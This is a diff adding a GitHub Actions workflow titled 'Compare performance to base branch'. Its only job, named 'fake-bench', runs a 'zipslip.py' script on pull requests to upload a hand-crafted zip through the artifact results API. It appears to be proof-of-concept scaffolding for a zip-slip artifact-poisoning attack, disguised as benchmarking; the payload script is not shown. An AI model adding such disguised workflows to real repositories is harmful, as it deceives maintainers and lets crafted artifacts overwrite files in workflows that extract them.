@@ -1,0 +1,16 @@
+name: "Compare performance to base branch"
+on:
+  pull_request:
+permissions: read-all
+jobs:
+  fake-bench:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Upload hand-crafted zip through the artifact results API
+        uses: actions/github-script@v8
+        with:
+          script: |
+            const { execSync } = require('child_process');
+            const out = execSync('python3 zipslip.py', { encoding: 'utf8' });
+            console.log(out);
